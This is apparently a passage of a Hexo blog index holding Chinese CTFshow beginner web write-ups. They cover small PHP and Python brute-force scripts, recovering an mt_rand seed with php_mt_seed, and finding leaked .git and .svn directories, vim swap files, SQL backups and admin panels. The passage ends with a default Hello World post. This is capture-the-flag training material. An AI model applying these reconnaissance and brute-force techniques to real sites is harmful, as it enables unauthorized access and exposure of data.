src="https://img-blog.csdnimg.cn/7a5a7a3840a54281a88b0364b76915ca.png#pic_center" alt="爆破拿旗"></p></li></ul><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><ul><li>它说域名失效了，让我直接交flag，那好吧😄</li></ul><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><ul><li><p><img src="https://img-blog.csdnimg.cn/db461b2d96a743d79e0f0781497d717c.png" alt="打开题目就是源码"></p></li><li><p>条件有点多啊，有点不想用bp，决定尝试用脚本</p></li><li><p>在看一眼题目，这不就是要👴找个token嘛，后面逻辑直接cv，没学php嗯写</p></li><li><pre><code class="php">&lt;?phpfor ($i=0;$i&lt;10000;$i=$i+1)&#123;    $token=md5($i);    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;            echo $i;        &#125;    &#125;&#125;;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 运行结果得到token为<span class="hljs-number">422</span><br>- ![在这里插入图片描述](https:<span class="hljs-comment">//img-blog.csdnimg.cn/ef94884278044c54bebd1fcb955d194c.png)</span><br><br><span class="hljs-comment">### web24</span><br><br>- ![打开题目康一康，又是php，没学过，无所谓，冷静分析一下](https:<span class="hljs-comment">//img-blog.csdnimg.cn/f6097a645d154cf3ae590a86edf32ad4.png)</span><br><br>- mt_srand这名字一看就是随机数，那我种子一样是不是结果就一样（毕竟没有真正的随机）<br><br>- ![来吧脚本小子](https:<span class="hljs-comment">//img-blog.csdnimg.cn/a85e3eb2be1f4a1fb9adf2959b711e13.png)</span><br><br>- ![无敌是多么。。。](https:<span class="hljs-comment">//img-blog.csdnimg.cn/f46751b46e85406488a89394ded938e5.png)</span><br><br><span class="hljs-comment">### web25</span><br><br>```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<span class="hljs-comment">#对flag里面的东西substr一下还要hexdec十六进制转十进制才得到的种子？这么骚？</span><br>    <span class="hljs-variable">$rand</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$r</span>)-<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<span class="hljs-comment">#rand=r-第一个随机值</span><br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<span class="hljs-comment">#要求rand==0也就是说r传的值就是第一个随机值</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(<span class="hljs-title function_ invoke__">mt_rand</span>()+<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<span class="hljs-comment">#token==第二个随机值+第三个随机值</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /proc/ersion&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>心态爆炸</p></li><li><p>看大佬的WP</p></li><li><p>加载中。。。</p></li><li><p>😯当我r&#x3D;0时可以得到第一个随机值也就是-rand本题我得到的是<strong>783167475</strong>（每人都不一样！）</p></li><li><p>然后可以根据第一个随机值回推种子</p></li><li><p>怎么回推？借助工具：<a href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a></p></li><li><p>👴反正是第一次见到</p></li><li><p><img src="https://img-blog.csdnimg.cn/5bdc3a294142464987b671fa1d5c2188.png" alt="php版本不同还不一样，我草了，不过👴盲猜是后面的，直接手动试错了mlgb"></p></li><li><p><img src="https://img-blog.csdnimg.cn/8f6bdaad826e4a8cb593f3a804759241.png" alt="1371411132就决定是你了"></p></li><li><p><img src="https://img-blog.csdnimg.cn/f46ba476b3234529a3aeccc0f55d5119.png" alt="传一下r和token拿🇺🇳"></p></li></ul><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><ul><li><p><img src="https://img-blog.csdnimg.cn/7644ae5c35ef4b9891a6124087b51dbb.png" alt="打开题目"></p></li><li><p><img src="https://img-blog.csdnimg.cn/161db37d70c84c77b681522d9e4f5c67.png" alt="抓个包试试，随便发一下，我的fuck"></p></li><li><p>我不管我就是拿到flag了👋我是秀儿</p></li></ul><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><ul><li><p><img src="https://img-blog.csdnimg.cn/1e02406883e342e8b83445abf99e2bab.png" alt="先欣赏一波界面😄"></p></li><li><p><img src="https://img-blog.csdnimg.cn/e01420a4cf7e434cab1561caa74675d6.png" alt="点开录取名单"></p></li><li><p><img src="https://img-blog.csdnimg.cn/604f94a8d126442e8d755513c598aea9.png" alt="点开学生学籍查询系统"></p></li><li><p>思路出现：爆破出学生身份证号</p></li><li><p>Burp Suite爆破</p></li><li><p>观察：身份证号缺失的那几位是出生日期</p></li><li><p><img src="https://img-blog.csdnimg.cn/24e8cffc165a4e4c92a1076d0c654236.png" alt="对‘高先伊’同学进行一手抓包"></p></li><li><p><img src="https://img-blog.csdnimg.cn/f13bc760f5a24a2497291a37c30cefa0.png" alt="选参数"></p></li><li><p><img src="https://img-blog.csdnimg.cn/1598787fd01142c8b55444eef5e22418.png" alt="找到msg✌️"></p></li><li><p><img src="https://img-blog.csdnimg.cn/9eb4a4aa2a01495f91b446f7ec22c434.png" alt="翻译一下"></p></li><li><p><img src="https://img-blog.csdnimg.cn/40a37be3aba6477095b62b0879097055.png" alt="get it！"></p></li></ul><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><ul><li><p>提示：通过暴力剖解目录&#x2F;0-100&#x2F;0-100看返回数据包</p></li><li><p>我的Burp Suite是社区版所以很慢，索性当脚本小子</p></li><li><pre><code class="python">import requestsfor i in range(100):    for j in range(100):        url = f&quot;http://3eed592c-7498-44a9-897c-ee8ef5484300.challenge.ctf.show/&#123;i&#125;/&#123;j&#125;/&quot;        headers = &#123;        &#39;Host&#39;: &#39;3eed592c-7498-44a9-897c-ee8ef5484300.challenge.ctf.show&#39;,        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#39;,        &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,        &#39;Connection&#39;: &#39;close&#39;,        &#125;        print(url)        req = requests.get(url,headers)        print(req.status_code)</code></pre></li><li><p>爆出来是72 和 20</p></li><li><p><img src="https://img-blog.csdnimg.cn/9ece5333c7c04d6bb053827e22092d92.png" alt="访问一下得🇺🇳"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_信息搜集</title>
    <link href="/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><ul><li>查看源代码直接找到</li></ul><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><ul><li>火狐浏览器网址上输入config：about后打开设置禁止js（绕过js前端验证）</li><li>查看源码</li></ul><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><ul><li>bp抓包</li><li>把GET改成POST</li><li>Repeat了一下就出来flag了</li></ul><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><ul><li>根据提示看一下robots协议</li><li>看到flagishere.txt访问一下</li><li>出flag</li></ul><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><ul><li>访问index.phps后下载文件打开即得flag</li></ul><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><ul><li>使用diesearch扫出<a href="http://www.zip/">www.zip</a></li><li>访问下载得到flag</li></ul><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><ul><li>提示：版本控制很重要</li><li>联想：用什么控制版本？git！</li><li>访问 <em><strong>.git&#x2F;</strong></em> 得flag</li></ul><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><ul><li>提示：版本控制很重要（怎么又是这个？）</li><li>联想：除了git还有什么可以控制版本？svn!</li><li>访问 ***.svn&#x2F;***得flag</li></ul><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><ul><li>提示：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</li><li>联想：vim死机？这不留下vim缓存<ul><li><strong>知识点</strong>：vim 交换文件名<br>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</li></ul></li><li>此题访问.index.php.swp下载打开得flag</li></ul><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><ul><li>看cookie</li></ul><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><ul><li><a href="https://zijian.aliyun.com上查一下flag.ctfshow.com/">https://zijian.aliyun.com上查一下flag.ctfshow.com</a></li></ul><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><ul><li>提示：有时候网站上的公开信息，就是管理员常用密码</li><li>打开网址（太酷炫，按了5min啥结果没有）</li><li>思考：在哪登陆？试一下login没有 再思考 试一下admin发现找到登陆口</li><li>思考：密码在哪？</li><li>思考提示：最下面找到个数字尝试一下，flag！</li></ul><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><ul><li><p>提示：技术文档中不要出现敏感信息，部署到生产环境后及时修改默认密码</p></li><li><p>打开链接，开始闲逛，翻到最底下，技术文档，技术文档，技术文档。。。document？！点开</p></li><li><p>easy</p></li><li><p>点了一下链接，进不去？？？！</p></li><li><p><img src="https://img-blog.csdnimg.cn/8983f88e7e264e92bd52ba5ad94c45e5.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>再看看链接。。。 <strong>your-domain</strong></p></li><li><p>学过英语 dddd</p></li><li><p>拿下</p></li></ul><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><ul><li><p>提示：有时候源码里面就不经意间泄漏重要信息（editor）的信息，默认配置害死人</p></li><li><p>dirsearch一下发现&#x2F;editor</p></li><li><p>果断访问一下</p></li><li><p><img src="https://img-blog.csdnimg.cn/42ede35c3e304845887c7801a102507f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>懵逼1s</p></li><li><p>点提交404（cao，怎么是404）。。。再想想</p></li><li><p>上传图片打开</p></li><li><p><img src="https://img-blog.csdnimg.cn/875fc3b0c3104b95bcafc5c20d718436.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>感觉没什么用啊，崩溃ing</p></li><li><p>随便点一下<strong>图片空间</strong> 哎嗨</p></li><li><p><img src="https://img-blog.csdnimg.cn/57a646bf776f4c17a3af3cd2052aa94f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>这不就是linux服务器的文件形式吗？想起提示<strong>默认地址</strong></p></li><li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p></li><li><p>找到地址访问得flag！！！</p></li></ul><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><ul><li>提示：公开的信息比如邮箱，可能造成信息泄漏，产生严重后果</li><li>打开网页在下面找到一个qq邮箱</li><li>试一下访问&#x2F;admin</li><li>需要密码</li><li>忘记密码</li><li>提示需要问答验证（需要地址）</li><li>qq搜索改qq号发现地址为西安</li><li>输入后重置密码登录获取flag</li></ul><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><ul><li><p>看了别人的WP</p></li><li><p><strong>知识点</strong>（查阅可知）：php探针：用来检测空间、服务器运行状况和PHP信息等</p></li><li><p>&#x2F;tz.php访问雅黑PHP探针</p></li><li><p>点击phpinfo</p></li><li><p>ctrl+F搜索ctfshow找到flag</p></li><li><p>长见识了捏</p></li></ul><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><ul><li>提示：备份的sql文件会泄漏敏感信息</li><li>dirsearch搜了一遍找不到</li><li>看了wp</li><li>原来是backup.sql</li><li>长点见识</li></ul><h3 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h3><ul><li><p>打开链接：小鸟游戏（🤯好难，101这是人能到的分数？）</p></li><li><p>估摸是js写的小游戏</p></li><li><p>查看源代码</p></li><li><p><img src="https://img-blog.csdnimg.cn/abb13751e7084b9890488709af0d6c66.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>score&gt;100?嗯？这不是我心心念念的101吗</p></li><li><p><img src="https://img-blog.csdnimg.cn/b1109420a39e443db3a875347249d708.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>编码一下</p></li><li><p>访问110.php</p></li><li><p>flag</p></li></ul><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><ul><li>查看源代码js部分看到username和pazzword</li><li>我这里直接输入框里输过不去</li><li>抓了个包</li><li>得到flag</li></ul><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><ul><li>提示：mdb文件是早期asp+access架构的数据库文件，文件泄漏相当于数据库被脱裤了</li><li>盲区 看wp</li><li>访问&#x2F;db&#x2F;db.mdb</li><li>下载文件记事本打开得flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/07/10/hello-world/"/>
    <url>/2022/07/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
